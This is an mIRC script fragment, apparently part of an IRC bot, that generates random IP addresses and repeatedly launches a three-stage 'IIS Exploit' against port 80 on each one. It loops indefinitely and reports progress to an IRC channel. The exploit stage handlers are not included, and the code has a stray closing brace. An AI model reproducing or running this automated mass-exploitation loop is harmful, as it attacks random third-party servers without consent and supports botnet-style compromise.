alias iisrand {
set %iisrandip $r(1,255) $+ . $+ $r(1,255) $+ . $+ $r(1,255) $+ . $+ $r(1,255)
}

alias autoiis {
iisrand | msg %c 4[15IIS Exploit4]14-4[15SCANING %iisrandip 4] | timer 1 1  /SockOpen stage1 %iisrandip 80 | timer 1 10 /SockOpen stage2 %iisrandip 80 | timer 1 20 /SockOpen stage3 %iisrandip 80 | timer 1 25 msg %c 4[15IIS Exploit4]14-4[15SCAN COMPLETE OF %iisrandip 4] | timer 1 30 autoiis }
}

